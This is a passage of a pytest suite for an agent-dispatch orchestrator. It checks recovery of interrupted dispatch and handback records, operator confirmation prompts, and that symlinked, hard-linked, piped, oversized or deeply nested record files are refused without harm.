                _link_directory(dispatch_dir, outside)
            else:
                _record_path(repo).unlink()
                os.symlink(external, _record_path(repo))
        return result

    monkeypatch.setattr(
        orchestrator, "_carry_over_path_traverses_link", check_then_swap
    )
    # A prompt would mean the outside record was read and accepted.
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(repo), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert swaps == [swapped]
    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert external.read_text(encoding="utf-8") == original
    assert [level for level, _message in messages] == ["WARN"]
    assert "symlink or junction" in messages[0][1]
    assert not (repo / "logs" / "dispatch" / "carry-over.json").exists()


def test_an_oversized_record_is_refused_unread_and_deleted(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    _write(_record_path(tmp_path), _plain_record_payload())
    _write(tmp_path / "src" / "app.py", "VALUE = 2\n")
    orchestrator = _orchestrator()
    monkeypatch.setattr(orchestrator, "IN_FLIGHT_RECORD_MAX_BYTES", 64)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert [level for level, _message in messages] == ["WARN"]
    assert "not valid" in messages[0][1]
    assert not _record_path(tmp_path).exists()


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="needs named pipes")
def test_a_pipe_at_the_record_path_does_not_block_startup(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    _record_path(tmp_path).parent.mkdir(parents=True, exist_ok=True)
    os.mkfifo(_record_path(tmp_path))
    orchestrator = _orchestrator()
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert [level for level, _message in messages] == ["WARN"]
    assert "not valid" in messages[0][1]
    assert not os.path.lexists(_record_path(tmp_path))


def test_a_hard_linked_record_is_refused_and_its_target_kept(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    external = tmp_path / "outside" / "victim.json"
    _write(external, _plain_record_payload())
    original = external.read_text(encoding="utf-8")
    _record_path(repo).parent.mkdir(parents=True, exist_ok=True)
    try:
        os.link(external, _record_path(repo))
    except (OSError, NotImplementedError):
        pytest.skip("cannot create a hard link here")
    _write(repo / "src" / "app.py", "VALUE = 2\n")
    orchestrator = _orchestrator()
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(repo), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert [level for level, _message in messages] == ["WARN"]
    assert "not valid" in messages[0][1]
    assert not _record_path(repo).exists()
    assert external.read_text(encoding="utf-8") == original


def _link_handoff_directory_outside(repo: Path, outside: Path) -> Path:
    """Swap docs/handoff for a link to ``outside``; return the external handoff."""

    external = outside / HANDOFF_RELATIVE_PATH.name
    _write(external, "external file\n")
    handoff_dir = repo / HANDOFF_RELATIVE_PATH.parent
    os.rename(handoff_dir, handoff_dir.parent / "moved")
    _link_directory(handoff_dir, outside)
    return external


def test_a_linked_handoff_path_is_refused_before_the_prompt(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    orchestrator = _orchestrator()
    _interrupt_backend(repo, orchestrator, monkeypatch)
    # Built before the link appears, as a running dispatcher's config is.
    config = _config(repo)
    external = _link_handoff_directory_outside(repo, tmp_path / "outside")
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        config, _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert external.read_text(encoding="utf-8") == "external file\n"
    assert not any("[y/N]" in message for _level, message in messages)
    warnings = [message for level, message in messages if level == "WARN"]
    assert len(warnings) == 1
    assert "docs/handoff/HANDOFF.md passes through a symlink or junction" in warnings[0]
    assert not _record_path(repo).exists()
    assert not (repo / "logs" / "dispatch" / "carry-over.json").exists()


def test_a_handoff_link_swapped_in_after_confirmation_is_not_written(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # The handoff path is clean when it is checked before the prompt; a link
    # appears before the restore. The writer walks the path again without
    # following links, so the external file is untouched and nothing is
    # carried over.
    repo = tmp_path / "repo"
    _init_repo(repo)
    orchestrator = _orchestrator()
    _interrupt_backend(repo, orchestrator, monkeypatch)
    config = _config(repo)
    outside = tmp_path / "outside"
    destination = repo.resolve() / HANDOFF_RELATIVE_PATH
    real_check = orchestrator._carry_over_path_traverses_link
    external_box: list[Path] = []

    def check_then_swap(path: Path) -> bool:
        result = real_check(path)
        if not external_box and path == destination:
            external_box.append(_link_handoff_directory_outside(repo, outside))
        return result

    monkeypatch.setattr(
        orchestrator, "_carry_over_path_traverses_link", check_then_swap
    )
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        config, _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert len(external_box) == 1
    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert external_box[0].read_text(encoding="utf-8") == "external file\n"
    assert sorted(path.name for path in outside.iterdir()) == ["HANDOFF.md"]
    assert any(
        level == "WARN"
        and message.startswith("Could not restore the half-written handoff")
        and "stay operator edits" in message
        for level, message in messages
    )
    assert not any(
        message.startswith("Restored the half-written handoff")
        for _level, message in messages
    )
    assert not _record_path(repo).exists()
    assert not (repo / "logs" / "dispatch" / "carry-over.json").exists()


def test_a_record_that_cannot_be_cleared_stops_before_the_commit(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Review finding: a record left behind by a finished dispatch would make
    # the next start treat it as interrupted, so the cycle must not go on to
    # commit and hand back as though the record were gone. RECOVERY-2b: this
    # applies only when the handback rewrite and the delete both fail.
    _init_repo(tmp_path)
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()
    real_unlink = orchestrator._unlink_carry_over_record
    real_write = orchestrator._write_carry_over_payload
    record_writes: list[str] = []

    def refusing_unlink(repo_root: Path, name: str = "carry-over.json") -> None:
        if name == IN_FLIGHT_STATE_PATH.name:
            raise PermissionError(13, "sharing violation")
        real_unlink(repo_root, name)

    def refusing_second_write(
        root: Path, content: str, name: str = "carry-over.json", **kwargs: Any
    ) -> None:
        if name == IN_FLIGHT_STATE_PATH.name:
            record_writes.append(json.loads(content)["phase"])
            if len(record_writes) > 1:
                raise PermissionError(13, "sharing violation")
        real_write(root, content, name, **kwargs)

    def finishing_backend(path: Path, **_kwargs: object) -> DispatchResult:
        _write(tmp_path / "src" / "app.py", "VALUE = 2\n")
        path.write_text(_pending_claim(), encoding="utf-8")
        return _result()

    monkeypatch.setattr(orchestrator, "_write_carry_over_payload", refusing_second_write)
    monkeypatch.setattr(orchestrator, "_unlink_carry_over_record", refusing_unlink)
    monkeypatch.setattr(orchestrator, "invoke_backend_role", finishing_backend)
    messages: list[tuple[str, str]] = []

    exit_code = orchestrator.run_loop(
        _config(tmp_path), max_cycles=1, log=_collecting_log(messages)
    )

    assert exit_code == 1
    assert record_writes == ["dispatch", "handback"]
    assert _git(tmp_path, "rev-parse", "HEAD") == head
    assert _record_path(tmp_path).exists()
    assert json.loads(_record_path(tmp_path).read_text(encoding="utf-8"))[
        "phase"
    ] == "dispatch"
    assert any(
        level == "WARN" and message.startswith("Could not delete the in-flight record")
        for level, message in messages
    )
    errors = [message for level, message in messages if level == "ERROR"]
    assert len(errors) == 1
    assert errors[0].startswith("Could not clear the in-flight record")
    assert "stops before its commit and gates" in errors[0]
    assert not any(
        message.startswith("Work-claim gate PASSED")
        or message.startswith("Work-claim gate FAILED")
        for _level, message in messages
    )


def test_a_transient_read_failure_keeps_the_record(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Review finding: only a record the reader rejects is invalid; a sharing
    # violation or I/O error says nothing about it, so it is kept.
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _interrupt_backend(tmp_path, orchestrator, monkeypatch)
    original = _record_path(tmp_path).read_text(encoding="utf-8")

    def failing_read(*_args: object, **_kwargs: object) -> bytes:
        raise PermissionError(13, "sharing violation")

    monkeypatch.setattr(orchestrator, "_read_carry_over_record", failing_read)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert _record_path(tmp_path).read_text(encoding="utf-8") == original
    assert [level for level, _message in messages] == ["WARN"]
    assert messages[0][1].startswith("Could not read the in-flight record")
    assert "sharing violation" in messages[0][1]
    assert "left for the next start" in messages[0][1]
    assert "not valid" not in messages[0][1]


def _escalation() -> str:
    return """---
next_agent: user
reason: "The dispatcher paused; an operator must decide."
status: escalate_to_user
producer: validator
---

# Dispatcher escalation

The dispatcher paused on this story.
"""


def test_load_in_flight_record_keys_a_continued_story_to_its_assignment() -> None:
    record = InFlightRecord(
        cycle=2,
        role="backend",
        story_key=f"story:{STORY_ID}",
        phase="dispatch",
        head_sha=None,
        handoff_content=_escalation(),
        dirty_fingerprints=(),
        carried_over=(),
        assignment_content=_assignment(),
    )
    text = in_flight_record_payload(record)

    loaded = load_in_flight_record(text)
    assert loaded == record
    assert loaded is not None and loaded.continues_saved_story
    payload = json.loads(text)
    payload["assignment_content"] = 5
    assert load_in_flight_record(json.dumps(payload)) is None
    payload["assignment_content"] = None
    # Without the assignment, the key must come from the escalation.
    assert load_in_flight_record(json.dumps(payload)) is None
    del payload["assignment_content"]
    assert load_in_flight_record(json.dumps(payload)) is None
    plain = json.loads(_plain_record_payload())
    del plain["assignment_content"]
    assert load_in_flight_record(json.dumps(plain)) is not None


def test_an_interrupted_operator_dispatch_continues_the_saved_story(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Review finding: an operator `@backend` dispatch from an escalation with
    # no story_id continued the saved story; its recovery must do the same
    # rather than reject the restored escalation for lacking a story_id.
    _init_repo(tmp_path, handoff=_escalation())
    orchestrator = _orchestrator()
    record = InFlightRecord(
        cycle=4,
        role="backend",
        story_key=f"story:{STORY_ID}",
        phase="dispatch",
        head_sha=_git(tmp_path, "rev-parse", "HEAD"),
        handoff_content=_escalation(),
        dirty_fingerprints=(),
        carried_over=(),
        assignment_content=_assignment(),
        protected_digests=orchestrator._protected_file_digests(_config(tmp_path)),
    )
    _write(_record_path(tmp_path), in_flight_record_payload(record))
    _write(tmp_path / "src" / "app.py", "VALUE = 2\n")
    branch_calls: list[dict[str, Any]] = []

    def fake_ensure_story_branch(**kwargs: Any) -> str | None:
        branch_calls.append(kwargs)
        return None

    seen_records: list[dict[str, Any]] = []
    instructions: list[str] = []

    def interrupted_again(path: Path, **kwargs: object) -> DispatchResult:
        seen_records.append(
            json.loads(_record_path(tmp_path).read_text(encoding="utf-8"))
        )
        instructions.append(str(kwargs.get("additional_instruction")))
        raise KeyboardInterrupt

    monkeypatch.setattr(orchestrator, "ensure_story_branch", fake_ensure_story_branch)
    monkeypatch.setattr(
        orchestrator, "saved_story_assignment", lambda _root: _assignment()
    )
    monkeypatch.setattr(
        orchestrator, "unfinished_story_pause_reason", lambda **_kwargs: None
    )
    monkeypatch.setattr(orchestrator, "invoke_backend_role", interrupted_again)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    with pytest.raises(KeyboardInterrupt):
        orchestrator.run_loop(
            _config(tmp_path, publish={"mode": "merge-commit"}),
            max_cycles=1,
            log=_collecting_log(messages),
        )

    assert ("INFO", "Routing source: interrupted_dispatch_recovery") in messages
    assert len(branch_calls) == 1
    assert branch_calls[0]["continue_saved_story"] is True
    assert (
        "INFO",
        f"Carrying over uncommitted work from the previous {STORY_ID} "
        "dispatch: src/app.py.",
    ) in messages
    assert len(instructions) == 1
    assert "interrupted before you handed back" in instructions[0]
    # The new record is keyed to the continued story, not the escalation.
    assert len(seen_records) == 1
    assert seen_records[0]["story_key"] == f"story:{STORY_ID}"
    assert seen_records[0]["handoff_content"] == _escalation()
    assert seen_records[0]["assignment_content"] == _assignment()


def test_restoring_a_flat_handoff_writes_inside_the_repository_root(
    tmp_path: Path,
) -> None:
    _init_repo(tmp_path)
    _write(tmp_path / "HANDOFF.md", HALF_WRITTEN_HANDOFF)
    orchestrator = _orchestrator()
    config = _config(tmp_path, handoff_path=Path("HANDOFF.md"))

    orchestrator._restore_handoff_text(config, _assignment())

    assert (tmp_path / "HANDOFF.md").read_bytes() == _assignment().encode("utf-8")
    assert sorted(
        path.name for path in tmp_path.iterdir() if path.name.startswith(".HANDOFF")
    ) == []


# ---------------------------------------------------------------------------
# RECOVERY-2b: the handback phase
# ---------------------------------------------------------------------------


def _handback_record(**overrides: Any) -> InFlightRecord:
    fields: dict[str, Any] = {
        "cycle": 2,
        "role": "backend",
        "story_key": f"story:{STORY_ID}",
        "phase": "handback",
        "head_sha": "a" * 40,
        "handoff_content": _assignment(),
        "dirty_fingerprints": (("notes.txt", "f" * 64),),
        "carried_over": ("src/app.py",),
        "handback_content": _pending_claim(),
        "handback_head_sha": "b" * 40,
        "protected_digests": (("AGENTS.md", "c" * 64),),
    }
    fields.update(overrides)
    return InFlightRecord(**fields)


def _resume_question() -> str:
    return (
        f"Resume backend's interrupted {STORY_ID} handback at the dispatcher "
        "commit? [y/N]"
    )


def _interrupt_handback(
    repo_root: Path,
    orchestrator: Any,
    monkeypatch: pytest.MonkeyPatch,
    *,
    operator_edit: bool = False,
) -> None:
    """Run one backend dispatch whose cycle is interrupted after it returned.

    The backend changes src/app.py and hands back; the cycle is then
    interrupted at the dispatcher commit, so a handback record stays on disk.
    """

    if operator_edit:
        _write(repo_root / "src" / "api.py", "API = 'operator'\n")

    def finishing_backend(path: Path, **_kwargs: object) -> DispatchResult:
        _write(repo_root / "src" / "app.py", "VALUE = 2\n")
        path.write_text(_pending_claim(), encoding="utf-8")
        return _result()

    def interrupted_commit(**_kwargs: object) -> None:
        raise KeyboardInterrupt

    with monkeypatch.context() as patch:
        patch.setattr(orchestrator, "invoke_backend_role", finishing_backend)
        patch.setattr(orchestrator, "_commit_for_implementer", interrupted_commit)
        _set_terminal(orchestrator, patch, interactive=False, operator_input=None)
        with pytest.raises(KeyboardInterrupt):
            orchestrator.run_loop(
                _config(repo_root), max_cycles=1, log=lambda *_: None
            )
    record = load_in_flight_record(_record_path(repo_root).read_text(encoding="utf-8"))
    assert record is not None and record.phase == "handback"


def _refuse_dispatch(orchestrator: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    def refusing_backend(path: Path, **_kwargs: object) -> DispatchResult:
        raise AssertionError("a resumed handback must not dispatch the role")

    monkeypatch.setattr(orchestrator, "invoke_backend_role", refusing_backend)


def test_a_handback_record_round_trips() -> None:
    record = _handback_record()
    text = in_flight_record_payload(record)
    payload = json.loads(text)

    assert list(payload) == sorted(payload)
    assert payload["phase"] == "handback"
    assert payload["handback_content"] == _pending_claim()
    assert payload["handback_head_sha"] == "b" * 40
    assert payload["protected_digests"] == [["AGENTS.md", "c" * 64]]
    assert payload["version"] == 1
    assert load_in_flight_record(text) == record


@pytest.mark.parametrize(
    ("phase", "change", "value"),
    [
        pytest.param("handback", "handback_content", None, id="handback_without_content"),
        pytest.param("handback", "handback_content", 5, id="handback_content_type"),
        pytest.param("dispatch", "handback_content", "text", id="dispatch_with_content"),
        pytest.param("handback", "handback_head_sha", 7, id="handback_head_sha_type"),
        pytest.param("dispatch", "handback_head_sha", ["b"], id="dispatch_head_sha_type"),
        pytest.param("handback", "protected_digests", "AGENTS.md", id="protected_type"),
        pytest.param("handback", "protected_digests", [["AGENTS.md"]], id="protected_pair"),
        pytest.param("handback", "protected_digests", [["AGENTS.md", 5]], id="protected_item"),
    ],
)
def test_load_in_flight_record_rejects_a_bad_handback(
    phase: str, change: str, value: Any
) -> None:
    payload = json.loads(in_flight_record_payload(_handback_record()))
    payload["phase"] = phase
    if phase == "dispatch":
        payload["handback_content"] = None
        payload["handback_head_sha"] = None
    payload[change] = value

    assert load_in_flight_record(json.dumps(payload)) is None


def test_a_handback_record_without_content_key_is_rejected() -> None:
    payload = json.loads(in_flight_record_payload(_handback_record()))
    del payload["handback_content"]

    assert load_in_flight_record(json.dumps(payload)) is None


def test_a_record_written_before_the_handback_phase_still_loads() -> None:
    payload = json.loads(_plain_record_payload())
    del payload["handback_content"]
    del payload["handback_head_sha"]
    del payload["protected_digests"]

    record = load_in_flight_record(json.dumps(payload))

    assert record is not None
    assert record.phase == "dispatch"
    assert record.handback_content is None
    assert record.handback_head_sha is None
    assert record.protected_digests is None


def _deeply_nested_record() -> str:
    depth = 200_000
    return "[" * depth + "]" * depth


def test_a_deeply_nested_record_is_not_valid() -> None:
    text = _deeply_nested_record()
    with pytest.raises(RecursionError):
        json.loads(text)

    assert load_in_flight_record(text) is None


def test_a_deeply_nested_record_is_deleted_at_startup(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _write(_record_path(tmp_path), _deeply_nested_record())
    assert _record_path(tmp_path).stat().st_size < orchestrator.IN_FLIGHT_RECORD_MAX_BYTES
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert not _record_path(tmp_path).exists()
    assert [level for level, _message in messages] == ["WARN"]
    assert "not valid" in messages[0][1]


def test_the_record_is_a_handback_record_until_the_cycle_ends(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()
    real_gate = orchestrator._run_work_claim_gate
    seen: list[dict[str, Any]] = []

    def finishing_backend(path: Path, **_kwargs: object) -> DispatchResult:
        _write(tmp_path / "src" / "app.py", "VALUE = 2\n")
        path.write_text(_pending_claim(), encoding="utf-8")
        return _result()

    def recording_gate(**kwargs: Any) -> bool:
        seen.append(json.loads(_record_path(tmp_path).read_text(encoding="utf-8")))
        return real_gate(**kwargs)

    monkeypatch.setattr(orchestrator, "invoke_backend_role", finishing_backend)
    monkeypatch.setattr(orchestrator, "_run_work_claim_gate", recording_gate)

    exit_code = orchestrator.run_loop(
        _config(tmp_path), max_cycles=1, log=lambda *_: None
    )

    assert exit_code == 0
    assert len(seen) == 1
    assert seen[0]["phase"] == "handback"
    assert seen[0]["handback_head_sha"] == head
    assert seen[0]["handback_content"] == _pending_claim()
    assert seen[0]["handoff_content"] == _assignment()
    assert not _record_path(tmp_path).exists()


def test_an_interrupted_handback_leaves_a_handback_record(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()

    _interrupt_handback(tmp_path, orchestrator, monkeypatch, operator_edit=True)

    record = load_in_flight_record(_record_path(tmp_path).read_text(encoding="utf-8"))
    assert record is not None
    assert record.phase == "handback"
    assert record.head_sha == head
    assert record.handback_head_sha == head
    assert record.handoff_content == _assignment()
    assert record.handback_content == _pending_claim()
    assert [path for path, _ in record.dirty_fingerprints] == ["src/api.py"]
    assert record.protected_digests == orchestrator._protected_file_digests(
        _config(tmp_path)
    )
    assert "AGENTS.md" in dict(record.protected_digests)


def test_the_loop_top_clears_the_handback_record(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Two cycles without max_cycles ending the run between them: the second
    # cycle's start (the loop top) deletes the first cycle's handback record.
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    seen: list[bool] = []

    def finishing_backend(path: Path, **_kwargs: object) -> DispatchResult:
        _write(tmp_path / "src" / "app.py", "VALUE = 2\n")
        path.write_text(_pending_claim(), encoding="utf-8")
        return _result()

    def auditor(*_args: object, **_kwargs: object) -> DispatchResult:
        seen.append(_record_path(tmp_path).exists())
        raise KeyboardInterrupt

    monkeypatch.setattr(orchestrator, "invoke_backend_role", finishing_backend)
    monkeypatch.setattr(orchestrator, "_dispatch_audit_fan_out", auditor)
    monkeypatch.setattr(
        orchestrator,
        "_invoke_support_callable",
        lambda *args, **kwargs: auditor(),
    )

    with pytest.raises(KeyboardInterrupt):
        orchestrator.run_loop(_config(tmp_path), max_cycles=3, log=lambda *_: None)

    assert seen == [False]


def test_a_confirmed_handback_resumes_at_the_commit_without_dispatching(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()
    _interrupt_handback(tmp_path, orchestrator, monkeypatch)
    assert _git(tmp_path, "rev-parse", "HEAD") == head
    _refuse_dispatch(orchestrator, monkeypatch)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    exit_code = orchestrator.run_loop(
        _config(tmp_path), max_cycles=1, log=_collecting_log(messages)
    )

    assert exit_code == 0
    assert ("INFO", _resume_question()) in messages
    prompt_index = messages.index(("INFO", _resume_question()))
    assert "protected-file baseline" in messages[prompt_index - 1][1]
    sha_level, sha_line = messages[prompt_index - 2]
    assert sha_level == "INFO"
    claim_sha = orchestrator._content_sha(_pending_claim())[:12]
    assert f"sha256 {claim_sha}" in sha_line
    assert "cannot verify" in messages[prompt_index - 3][1]
    assert "Files in scope: src/app.py, tests/test_app.py" in messages[
        prompt_index - 3
    ][1]
    assert ("INFO", "Routing source: interrupted_handback_recovery") in messages
    assert not any("Dispatching backend" in message for _level, message in messages)
    assert any(
        level == "AGENT" and message == "Work-claim gate PASSED for backend."
        for level, message in messages
    )
    assert _git(tmp_path, "rev-parse", "HEAD") != head
    assert _commit_files(tmp_path, "HEAD") == ["src/app.py"]
    assert not _record_path(tmp_path).exists()
    handoff = (tmp_path / HANDOFF_RELATIVE_PATH).read_text(encoding="utf-8")
    assert "next_agent: auditor" in handoff
    assert PENDING_COMMIT_SHA not in handoff


@pytest.mark.parametrize(
    ("interactive", "operator_input"),
    [
        pytest.param(False, None, id="no_tty"),
        pytest.param(True, "n\n", id="tty_declines"),
        pytest.param(True, "", id="tty_eof"),
    ],
)
def test_an_unconfirmed_handback_is_discarded_and_files_stay_unstaged(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    interactive: bool,
    operator_input: str | None,
) -> None:
    _init_repo(tmp_path)
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()
    _interrupt_handback(tmp_path, orchestrator, monkeypatch)
    _set_terminal(
        orchestrator,
        monkeypatch,
        interactive=interactive,
        operator_input=operator_input,
    )
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    asked = ("INFO", _resume_question()) in messages
    assert asked == interactive
    assert any(
        level == "WARN"
        and "Discarded the in-flight handback record" in message
        and "src/app.py" in message
        and "stay operator edits" in message
        for level, message in messages
    )
    assert not _record_path(tmp_path).exists()
    assert _git(tmp_path, "rev-parse", "HEAD") == head
    assert _git(tmp_path, "diff", "--cached", "--name-only") == ""
    assert "src/app.py" in _git(tmp_path, "status", "--porcelain")
    assert (tmp_path / HANDOFF_RELATIVE_PATH).read_text(
        encoding="utf-8"
    ) == _pending_claim()


def test_dry_run_keeps_the_handback_record(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _interrupt_handback(tmp_path, orchestrator, monkeypatch)
    original = _record_path(tmp_path).read_text(encoding="utf-8")
    _refuse_dispatch(orchestrator, monkeypatch)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(
        _config(tmp_path, dry_run=True), max_cycles=1, log=_collecting_log(messages)
    )

    assert _record_path(tmp_path).read_text(encoding="utf-8") == original
    found = [
        message
        for level, message in messages
        if level == "INFO" and message.startswith("Found in-flight record")
    ]
    assert len(found) == 1
    assert "handed back" in found[0]
    assert "src/app.py" in found[0]
    assert found[0].endswith("Not applied in dry run.")
    assert ("INFO", _resume_question()) not in messages


@pytest.mark.parametrize("change", ["head", "handoff"])
def test_a_moved_head_or_changed_handoff_discards_the_handback_record(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    change: str,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _interrupt_handback(tmp_path, orchestrator, monkeypatch)
    handoff = tmp_path / HANDOFF_RELATIVE_PATH
    if change == "head":
        _git(tmp_path, "commit", "-q", "--allow-empty", "-m", "operator commit")
        expected_handoff = _pending_claim()
    else:
        expected_handoff = _planner_assignment()
        _write(handoff, expected_handoff)
    # Neither a prompt nor a restore may happen.
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert [level for level, _message in messages] == ["WARN"]
    warning = messages[0][1]
    assert warning.startswith("Discarded the in-flight handback record")
    assert "backend" in warning
    assert STORY_ID in warning
    assert "Nothing is resumed" in warning
    assert ("HEAD moved" if change == "head" else "the handoff changed") in warning
    assert not _record_path(tmp_path).exists()
    assert handoff.read_text(encoding="utf-8") == expected_handoff


def test_a_changed_operator_file_pauses_the_handback_and_is_never_staged(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()
    _interrupt_handback(tmp_path, orchestrator, monkeypatch, operator_edit=True)
    _write(tmp_path / "src" / "api.py", "API = 'operator, revised'\n")
    _refuse_dispatch(orchestrator, monkeypatch)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(_config(tmp_path), max_cycles=1, log=_collecting_log(messages))

    pauses = [
        message
        for level, message in messages
        if level == "PAUSE" and message.startswith("INTERRUPTED HANDBACK:")
    ]
    assert len(pauses) == 1
    assert "src/api.py" in pauses[0]
    assert "src/app.py" in pauses[0]
    assert "never stages or commits" in pauses[0]
    assert not _record_path(tmp_path).exists()
    assert _git(tmp_path, "rev-parse", "HEAD") == head
    assert _git(tmp_path, "diff", "--cached", "--name-only") == ""
    assert "src/api.py" in _git(tmp_path, "status", "--porcelain")
    carry_over = json.loads(
        (tmp_path / "logs" / "dispatch" / "carry-over.json").read_text(encoding="utf-8")
    )
    assert "src/app.py" in json.dumps(carry_over)
    assert "src/api.py" not in json.dumps(carry_over)


def test_a_failed_handback_rewrite_deletes_the_record_and_the_cycle_goes_on(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()
    real_write = orchestrator._write_carry_over_payload
    phases: list[str] = []

    def refusing_handback_write(
        root: Path, content: str, name: str = "carry-over.json", **kwargs: Any
    ) -> None:
        if name == IN_FLIGHT_STATE_PATH.name:
            phases.append(json.loads(content)["phase"])
            if phases[-1] == "handback":
                raise PermissionError(13, "sharing violation")
        real_write(root, content, name, **kwargs)

    def finishing_backend(path: Path, **_kwargs: object) -> DispatchResult:
        _write(tmp_path / "src" / "app.py", "VALUE = 2\n")
        path.write_text(_pending_claim(), encoding="utf-8")
        return _result()

    monkeypatch.setattr(
        orchestrator, "_write_carry_over_payload", refusing_handback_write
    )
    monkeypatch.setattr(orchestrator, "invoke_backend_role", finishing_backend)
    messages: list[tuple[str, str]] = []

    exit_code = orchestrator.run_loop(
        _config(tmp_path), max_cycles=1, log=_collecting_log(messages)
    )

    assert exit_code == 0
    assert phases == ["dispatch", "handback"]
    assert not _record_path(tmp_path).exists()
    assert _git(tmp_path, "rev-parse", "HEAD") != head
    assert not any(level == "ERROR" for level, _message in messages)


def test_a_handback_record_that_cannot_be_cleared_stops_the_run(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    real_unlink = orchestrator._unlink_carry_over_record

    def refusing_unlink(repo_root: Path, name: str = "carry-over.json") -> None:
        if name == IN_FLIGHT_STATE_PATH.name:
            raise PermissionError(13, "sharing violation")
        real_unlink(repo_root, name)

    def finishing_backend(path: Path, **_kwargs: object) -> DispatchResult:
